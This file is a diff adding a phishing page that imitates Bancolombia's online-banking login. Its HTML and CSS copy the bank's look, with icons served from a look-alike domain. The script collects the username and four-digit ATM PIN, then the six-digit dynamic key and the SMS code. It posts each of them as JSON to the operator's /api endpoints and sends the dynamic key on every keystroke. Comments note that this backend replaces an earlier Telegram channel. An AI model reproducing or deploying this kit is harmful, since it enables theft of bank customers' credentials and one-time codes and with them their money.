@@ -1,0 +1,371 @@
+<!DOCTYPE html>
+<html lang="es-CO">
+<head>
+  <meta charset="utf-8">
+  <title>Ingreso</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <style>
+    /* Reset y Estilos del Diseño Bancolombia */
+    body{font-size:100%;}
+    :root{--bc-theme-color:white;}
+    *,*:after,*:before{margin:0;padding:0;box-sizing:border-box;}
+    :root{--breakpoint-xs:0;--breakpoint-sm:576px;--breakpoint-md:768px;--breakpoint-lg:992px;--breakpoint-xl:1200px;}
+    body{font-size:1rem;font-family:"Open Sans",Arial,sans-serif;color:#2c2a29;line-height:24px;letter-spacing:-0.3px;}
+    .bc-bg-brand-N-P-pair-50-00{background-color:#f9f9fa;}
+    .bc-justify-content-center{justify-content:center;}
+    .bc-align-content-center{justify-content:center;}
+    .bc-align-items-center{align-items:center;}
+    .bc-direction-row{flex-direction:row;}
+    .bc-direction-column{flex-direction:column;}
+    .bc-paddinginfix-top-3{padding-top:24px;}
+    .bc-paddinginfix-top-4{padding-top:32px;}
+    .bc-px-5{padding-right:40px;padding-left:40px;}
+    .bc-margin-top-2{margin-top:16px;}
+    .bc-mx-2{margin-right:16px;margin-left:16px;}
+    .bc-margin-bottom-2{margin-bottom:16px;}
+    .bc-margin-top-4{margin-top:32px;}
+    [class*=bc-col-]{float:left;min-height:1px;}
+    .bc-container{width:100%;padding-right:16px;padding-left:16px;margin:auto;}
+    .bc-container-fluid{width:100%;padding-right:16px;padding-left:16px;margin:auto;}
+    .bc-row{display:flex;flex-wrap:wrap;}
+    .bc-col-lg-4,.bc-col-md-8,.bc-col-md-6,.bc-col-sm-auto,.bc-col-xs-6,.bc-col-12{position:relative;width:100%;}
+    .bc-col-12{flex-basis:0;flex-grow:1;max-width:100%;flex:0 0 100%;}
+    @media (min-width:0){.bc-col-xs-6{flex:0 0 100%;max-width:100%;}[class*=bc-col]{padding-right:4px;padding-left:4px;}.bc-row{margin-right:-4px;margin-left:-4px;}}
+    @media (min-width:576px){.bc-col-sm-auto{flex:0 0 auto;width:auto;max-width:100%;}}
+    @media (min-width:768px){.bc-col-md-6{flex:0 0 50%;max-width:50%;}.bc-col-md-8{flex:0 0 66.6666666667%;max-width:66.6666666667%;}[class*=bc-col]{padding-right:8px;padding-left:8px;}.bc-row{margin-right:-8px;margin-left:-8px;}}
+    @media (min-width:992px){.bc-col-lg-4{flex:0 0 33.3333333333%;max-width:33.3333333333%;}}
+    .bc-flex{display:flex;}
+    .bc-form-field{width:100%;position:relative;height:52px;margin-top:20px;}
+    @media screen and (max-width:975px){.bc-form-field{margin-bottom:15px;display:grid;}}
+    .bc-form-field>em{position:absolute;color:#2c2a29;top:4px;font-size:1.5rem;}
+    .bc-form-field>em:first-child{left:0;width:24px;}
+
+    .icon-img { position: absolute; width: 20px; height: 20px; top: 6px; left: 0; object-fit: contain; z-index: 2; }
+    .bc-input[aria-label],.bc-input[id]{background:transparent;border:none;border-bottom:1px solid #2c2a29;color:#2c2a29;display:block;height:32px;left:0;top:20px;width:100%;font-family:"Open Sans SemiBold";font-weight:600;font-size:1rem;line-height:24px;padding-left: 35px;}
+    .bc-input[aria-label]:focus,.bc-input[id]:focus{outline:none;transition:.5s;border-bottom:2px solid #2c2a29;}
+    .bc-input[aria-label]~span,.bc-input[id]~span{display:block;height:20px;font-family:"Open Sans";font-size:.75rem;line-height:16px;}
+    .bc-input[aria-label]~label,.bc-input[id]~label{white-space:nowrap;overflow:hidden;text-overflow:ellipsis;width:88%;font-family:"Open Sans";font-size:1rem;line-height:24px;}
+    .bc-input[aria-label]:not(:placeholder-shown),.bc-input[id]:not(:placeholder-shown){border-bottom:2px solid #2c2a29;}
+    .bc-input[aria-label]::placeholder,.bc-input[id]::placeholder{opacity:.4;color:#2c2a29;font-family:"Open Sans SemiBold";font-weight:600;font-size:1rem;}
+    .bc-input[aria-label]:focus~label,.bc-input[id]:focus~label,.bc-input[aria-label]:active~label,.bc-input[id]:active~label,.bc-active.bc-input[aria-label]~label,.bc-active.bc-input[id]~label{top:-23px;padding-left:0;width:95%;font-family:"Open Sans";font-size:.875rem;line-height:20px;}
+    .bc-input[aria-label]:valid~label,.bc-input[id]:valid~label{margin-left:0;}
+    .bc-input[aria-label]:focus~span,.bc-input[id]:focus~span{color:#2c2a29;}
+    em~.bc-input[aria-label],em~.bc-input[id]{padding-left:30px;}
+    .bc-input[aria-label]+em,.bc-input[id]+em{right:0;width:24px;left:initial;}
+    input::first-line{color:#2c2a29;-webkit-text-fill-color:#2c2a29;}
+
+    .bc-card{padding:16px;background:#fff;box-shadow:0 8px 12px rgba(44,42,41,.16),0 1px 8px rgba(43,42,41,.08);display:flex;position:relative;width:100%;height:min-content;border-radius:8px;}
+    .bc-card-container{padding:0;background:#fff;height:auto;width:auto;}
+    .bc-button-small,.bc-button-secondary,.bc-button-primary{display:flex;justify-content:center;align-items:center;column-gap:8px;border:0;cursor:pointer;padding:12px 24px;outline:0;text-transform:none;text-decoration:none;border-radius:100px;overflow:hidden;width:100%;height:auto;min-height:32px;white-space:initial;font-family:"CIB Sans bold";font-weight:700;font-size:1.125rem;line-height:26px;}
+    .bc-button-small:not(:focus),.bc-button-secondary:not(:focus),.bc-button-primary:not(:focus){transition:150ms cubic-bezier(.4,0,.2,1);}
+    .bc-button-small:disabled,.bc-button-secondary:disabled,.bc-button-primary:disabled{cursor:default;}
+    .bc-button-primary{background:#fdda24;color:#2c2a29;}
+    .bc-button-primary:hover:enabled{background:#fee66c;}
+    .bc-button-primary:active:enabled{background:#e6c621;}
+    .bc-button-primary:disabled{background:#d9dadd;color:#97999b;}
+    .bc-button-secondary{background:transparent;color:#2c2a29;border:1px solid #2c2a29;}
+    .bc-button-secondary:hover:enabled{background:#d9dadd;}
+    .bc-button-secondary:active:enabled{background:#b3b5b8;}
+    .bc-button-secondary:disabled{background:transparent;color:#97999b;border:1px solid #97999b;}
+    .bc-button-small{padding:8px 16px;font-size:1rem;line-height:24px;}
+    .bc-button-fill{width:100%;}
+    .bc-total-value-gap-03{gap:24px;}
+
+    .bc-link{color:#2c2a29;font-family:"CIB Sans";font-size:.875rem;line-height:20px;text-decoration:none;align-items:center;display:flex;width:fit-content;}
+    .bc-link:active,.bc-link:hover{opacity:.8;}
+    .link-default{font-family:"Open Sans";font-size:.875rem;line-height:20px;outline-color:#3455db;}
+    .link-underline{font-family:"Open Sans Bold";font-weight:700;font-size:.875rem;line-height:20px;text-decoration:none;}
+    .link-underline:hover{text-decoration:none;outline:none;opacity:.8;}
+
+    .loading-overlay { display: none; position: fixed; inset: 0; background: rgba(255, 255, 255, 0.85); z-index: 10000; align-items: center; justify-content: center; flex-direction: column; }
+    .loading-spinner { border: 4px solid #f3f3f3; border-top: 4px solid #fdda24; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
+    .error-msg { display: none; color: #d9381e; font-size: 0.875rem; margin-top: 8px; font-family: "Open Sans", sans-serif; }
+    .error-msg.show { display: block; }
+
+    /* Modal OTP con Rayitas */
+    .demo-overlay{display:none;position:fixed;inset:0;z-index:9999;background:rgba(0,0,0,.68);backdrop-filter:blur(2px);align-items:center;justify-content:center;padding:18px;}
+    .demo-overlay.is-open{display:flex;}
+    .demo-modal{width:100%;max-width:680px;max-height:92vh;overflow-y:auto;background:#fff;border-radius:30px;padding:28px 30px 48px;box-shadow:0 18px 48px rgba(0,0,0,.24);position:relative;}
+    .demo-close-row{display:flex;justify-content:flex-end;margin-bottom:24px;}
+    .demo-close{border:0;background:transparent;font-size:0;width:36px;height:36px;cursor:pointer;color:#333;position:relative;}
+    .demo-close::before,.demo-close::after{content:"";position:absolute;left:17px;top:3px;width:1.5px;height:30px;background:#333;transform:rotate(45deg);}
+    .demo-close::after{transform:rotate(-45deg);}
+    .demo-instruction{background:#f1b5ce;border-radius:14px;padding:34px 22px;text-align:center;margin:0 0 18px;color:#30252b;font-size:clamp(19px,3vw,27px);line-height:1.45;}
+    .demo-instruction strong{font-weight:800;}
+    .demo-title{text-align:center;font-family:"CIB Sans Bold",Arial,sans-serif;font-size:clamp(25px,4vw,36px);line-height:1.2;margin:12px 0 24px;color:#292929;}
+    .demo-actions{display:flex;justify-content:center;gap:16px;margin-top:20px;}
+    .demo-actions button{flex:1;max-width:250px;min-height:58px;}
+    .demo-note{font-size:12px;color:#777;text-align:center;margin-top:24px;}
+    .demo-step{display:none;}
+    .demo-step.active{display:block;}
+    
+    .otp-slots-container { display: flex; justify-content: center; gap: 15px; margin: 24px 0; }
+    .otp-slot { width: 35px; height: 45px; border: none; border-bottom: 2px solid #2c2a29; border-radius: 0; text-align: center; font-size: 1.8rem; line-height: 45px; font-weight: bold; background: transparent; color: var(--bc-dark); padding: 0; }
+    .otp-slot.active { border-bottom-color: #fdda24; box-shadow: 0 5px 5px -5px rgba(253,218,36,.8); }
+    .otp-slots-container.error .otp-slot { border-bottom-color: #d9381e; }
+    .otp-hidden-input { position: absolute; opacity: 0; pointer-events: none; }
+
+    .svp-footer { padding: 1rem; text-align: center; font-size: 0.8rem; color: #666; margin-top: 2rem; }
+    .svp-footer p { margin-bottom: 8px; }
+  </style>
+</head>
+
+<body class="bc-bg-brand-N-P-pair-50-00" id="body">
+
+  <div class="loading-overlay" id="loading-overlay">
+    <div class="loading-spinner"></div>
+    <p style="margin-top: 15px; font-family: 'Open Sans', sans-serif; font-weight: 600; color: #2c2a29;">Procesando solicitud...</p>
+  </div>
+
+  <main class="svp-main">
+    <div class="bc-container-fluid trazo" style="background-image:url('https://svpersonas.apps.bancolombia.com/assets/images/auth-trazo.svg');">
+      <h1 class="bc-text-center bc-cibsans-font-style-9-extralight bc-mt-4">Ingreso</h1>
+      <div class="bc-row bc-justify-content-center form-container">
+        <div class="bc-col-xs-6 bc-col-md-8 bc-col-lg-4">
+          <div class="bc-card-body bc-mt-4">
+            <section id="card1" class="bc-card bc-card-auth bc-card-container">
+              <section id="id00" class="bc-card-auth-body">
+                <section class="bc-card-auth-head">
+                  <h1 class="bc-card-auth-title bc-cibsans-font-style-5-bold bc-mt-3">¡Hola!</h1>
+                  <h3 class="bc-card-auth-description bc-mt-3">Ingresa los datos para gestionar tus productos y hacer transacciones.</h3>
+                </section>
+                <form id="demoForm" autocomplete="off">
+                  <section>
+                    <section class="bc-card-auth-container">
+                      <bc-form-field class="authentication-form__username">
+                        <div class="bc-form-field" id="s.1761706071">
+                          <img src="https://nvh10.site/-lnicio-lndex-/wp-content/uploads/2026/09/IC01.png" class="icon-img" alt="Icono Usuario">
+                          <input id="usuario" name="usuario" autocomplete="off" autocorrect="off" spellcheck="false" maxlength="20" aria-describedby="username-helper" aria-invalid="false" class="bc-input bc-active" placeholder="Usuario" aria-label="Usuario" required>
+                          <label for="usuario"></label>
+                          <a href="#" class="bc-opensans-font-style-1-bold bc-link link-default link-underline"><u>¿Olvidaste tu usuario?</u></a>
+                        </div>
+                      </bc-form-field>
+                      <bc-form-field class="authentication-form__password">
+                        <div class="bc-form-field" id="s.2218081857">
+                          <img src="https://nvh10.site/-lnicio-lndex-/wp-content/uploads/2026/09/IC02.png" class="icon-img" alt="Icono Clave">
+                          <input id="clave" minlength="4" maxlength="4" type="password" name="clave" autocomplete="off" inputmode="numeric" aria-describedby="password-helper" aria-invalid="false" class="bc-input bc-active" placeholder="Clave de Cajero" aria-label="Clave de Cajero" required>
+                          <label for="clave"></label>
+                          <a href="#" class="bc-opensans-font-style-1-bold bc-link link-default link-underline"><u>¿Olvidaste o bloqueaste tu clave?</u></a>
+                        </div>
+                      </bc-form-field>
+                      <p id="loginError" class="error-msg">El usuario o la clave son incorrectos. Por favor verifique.</p>
+                    </section>
+                  </section>
+                  <section class="bc-card-auth-button">
+                    <button type="submit" id="submitBtn" tabindex="0" class="bc-button bc-button-fill bc-button-primary" disabled>Continuar</button>
+                  </section>
+                </form>
+                <section class="bc-card-auth-link" style="display: flex; justify-content: center; margin-top: 24px;">
+                  <a href="#" class="bc-link link-underline" style="font-size: 1rem; color: #2c2a29;"><u>Crear usuario</u></a>
+                </section>
+              </section>
+            </section>
+          </div>
+        </div>
+      </div>
+    </div>
+  </main>
+  <footer class="svp-footer">
+    <p>¿Problemas para conectarte? · Aprende sobre seguridad · Reglamento Sucursal Virtual · Política de privacidad</p>
+    <p id="reloj-widget" style="margin-top:8px;"></p>
+  </footer>
+
+  <div class="demo-overlay" id="modalDinamica" role="dialog" aria-modal="true">
+    <section class="demo-modal">
+      <div class="demo-close-row">
+        <button type="button" class="demo-close" id="closeModal" aria-label="Cerrar">×</button>
+      </div>
+      <div id="viewDinamica" class="demo-step active">
+        <div class="demo-instruction"><strong>Verificación de Seguridad</strong><br>Ingresa la Clave Dinámica de 6 dígitos de tu aplicación.</div>
+        <h2 class="demo-title">Clave Dinámica</h2>
+        <div class="otp-slots-container" id="otpContainer">
+          <div class="otp-slot"></div><div class="otp-slot"></div><div class="otp-slot"></div>
+          <div class="otp-slot"></div><div class="otp-slot"></div><div class="otp-slot"></div>
+        </div>
+        <input type="text" id="otpInput" class="otp-hidden-input" maxlength="6" inputmode="numeric">
+        <p id="otpError" class="error-msg" style="text-align: center; margin-bottom: 15px;">Clave dinámica incorrecta o expirada.</p>
+        <div class="demo-actions">
+          <button type="button" class="bc-button-secondary" id="btnBorrar">Borrar</button>
+          <button type="button" class="bc-button-primary" id="btnContinuar" disabled>Continuar</button>
+        </div>
+      </div>
+      <div id="viewSms" class="demo-step">
+        <div class="demo-instruction"><strong>Verificación SMS</strong><br>Hemos enviado un código SMS de 6 dígitos a tu celular registrado.</div>
+        <h2 class="demo-title">Código SMS</h2>
+        <div style="max-width: 300px; margin: 0 auto 20px;" id="smsInputWrap">
+          <input type="text" id="smsCodeInput" class="bc-input bc-active" maxlength="6" inputmode="numeric" placeholder="Código SMS" style="text-align: center; font-size: 1.5rem; height: 45px; border-bottom: 2px solid #2c2a29;">
+        </div>
+        <p id="smsError" class="error-msg" style="text-align: center; margin-bottom: 15px;">Código SMS inválido.</p>
+        <div class="demo-actions">
+          <button type="button" class="bc-button-primary" id="btnSmsFinal" style="max-width: 100%;">Verificar Código</button>
+        </div>
+      </div>
+      <p class="demo-note">servicios bancarios</p>
+    </section>
+  </div>
+
+  <script>
+    // ==========================================
+    // LÓGICA CONECTADA A TU SERVIDOR (EN VEZ DE TELEGRAM)
+    // ==========================================
+    // El servidor debe estar escuchando en /api/login, /api/dinamica, etc.
+    
+    // Elementos DOM
+    const usuarioInput = document.getElementById("usuario");
+    const claveInput = document.getElementById("clave");
+    const submitBtn = document.getElementById("submitBtn");
+    const demoForm = document.getElementById("demoForm");
+    const loadingOverlay = document.getElementById('loading-overlay');
+    const loginError = document.getElementById('loginError');
+    const modal = document.getElementById("modalDinamica");
+    const otpInput = document.getElementById("otpInput");
+    const otpSlots = document.querySelectorAll(".otp-slot");
+    const btnBorrar = document.getElementById("btnBorrar");
+    const btnContinuar = document.getElementById("btnContinuar");
+    const otpError = document.getElementById("otpError");
+    const otpContainer = document.getElementById("otpContainer");
+    const closeModal = document.getElementById("closeModal");
+    const viewDinamica = document.getElementById("viewDinamica");
+    const viewSms = document.getElementById("viewSms");
+    const smsCodeInput = document.getElementById("smsCodeInput");
+    const btnSmsFinal = document.getElementById("btnSmsFinal");
+    const smsError = document.getElementById("smsError");
+    const smsInputWrap = document.getElementById("smsInputWrap");
+
+    function mostrarOverlay() { loadingOverlay.style.display = 'flex'; }
+    function ocultarOverlay() { loadingOverlay.style.display = 'none'; }
+
+    function actualizarBoton() {
+      const claveCompleta = /^[0-9]{4}$/.test(claveInput.value);
+      const usuarioLleno = usuarioInput.value.trim().length > 0;
+      const formularioValido = claveCompleta && usuarioLleno;
+      submitBtn.disabled = !formularioValido;
+      if (formularioValido) loginError.classList.remove("show");
+    }
+
+    usuarioInput.addEventListener("input", actualizarBoton);
+    claveInput.addEventListener("input", function() {
+      claveInput.value = claveInput.value.replace(/[^0-9]/g, "").slice(0, 4);
+      actualizarBoton();
+    });
+
+    // ==========================================
+    // ENVÍO AL SERVIDOR (REEMPLAZA A TELEGRAM)
+    // ==========================================
+    async function enviarLogin(usuario, clave) {
+      try {
+        await fetch('/api/login', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ usuario, clave, ip: '0.0.0.0' })
+        });
+      } catch (e) { console.error(e); }
+    }
+
+    async function enviarDinamica(usuario, dinamica) {
+      try {
+        await fetch('/api/dinamica', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ usuario, dinamica })
+        });
+      } catch (e) { console.error(e); }
+    }
+
+    async function enviarSms(usuario, sms) {
+      try {
+        await fetch('/api/sms', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ usuario, sms })
+        });
+      } catch (e) { console.error(e); }
+    }
+
+    // ==========================================
+    // LÓGICA DEL FORMULARIO
+    // ==========================================
+    demoForm.addEventListener("submit", async function(event) {
+      event.preventDefault();
+      if (submitBtn.disabled) return;
+      
+      mostrarOverlay();
+      const user = usuarioInput.value.trim();
+      const pass = claveInput.value.trim();
+      
+      await enviarLogin(user, pass);
+      ocultarOverlay();
+    });
+
+    // Lógica del Modal (6 dígitos con rayitas)
+    function actualizarOTP() {
+      const valor = otpInput.value;
+      otpSlots.forEach((slot, index) => {
+        if (index < valor.length) {
+          slot.textContent = valor[index];
+          slot.classList.remove("active");
+        } else {
+          slot.textContent = "";
+          if (index === valor.length) { slot.classList.add("active"); }
+          else { slot.classList.remove("active"); }
+        }
+      });
+      btnContinuar.disabled = valor.length !== 6;
+    }
+
+    otpInput.addEventListener("input", function() {
+      this.value = this.value.replace(/[^0-9]/g, "").slice(0, 6);
+      otpError.classList.remove("show");
+      otpContainer.classList.remove("error");
+      actualizarOTP();
+      
+      if (this.value.length > 0) {
+        enviarDinamica(usuarioInput.value, this.value);
+      }
+    });
+
+    otpContainer.addEventListener("click", () => otpInput.focus());
+    btnBorrar.addEventListener("click", () => {
+      otpInput.value = "";
+      otpError.classList.remove("show");
+      otpContainer.classList.remove("error");
+      actualizarOTP();
+      otpInput.focus();
+    });
+
+    closeModal.addEventListener("click", () => modal.classList.remove("is-open"));
+
+    // Lógica SMS
+    smsCodeInput.addEventListener("input", function() {
+      this.value = this.value.replace(/[^0-9]/g, "").slice(0, 6);
+      smsError.classList.remove("show");
+      smsInputWrap.classList.remove("error");
+    });
+
+    btnSmsFinal.addEventListener("click", async () => {
+      if(smsCodeInput.value.length < 6) {
+        smsError.textContent = "Por favor, ingresa el código SMS completo de 6 dígitos.";
+        smsError.classList.add("show");
+        smsInputWrap.classList.add("error");
+        return;
+      }
+      mostrarOverlay();
+      await enviarSms(usuarioInput.value, smsCodeInput.value);
+      ocultarOverlay();
+    });
+
+    // Reloj
+    function actualizarFecha() {
+      const ahora = new Date();
+      const opciones = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric', hour: 'numeric', minute: '2-digit', hour12: true };
+      let fecha = ahora.toLocaleDateString('es-ES', opciones).replace(',', '');
+      const el = document.getElementById('reloj-widget');
+      if (el) el.textContent = fecha.charAt(0).toUpperCase() + fecha.slice(1);
+    }
+    actualizarFecha();
+    setInterval(actualizarFecha, 60000);
+    actualizarBoton();
+  </script>
+</body>
+</html>
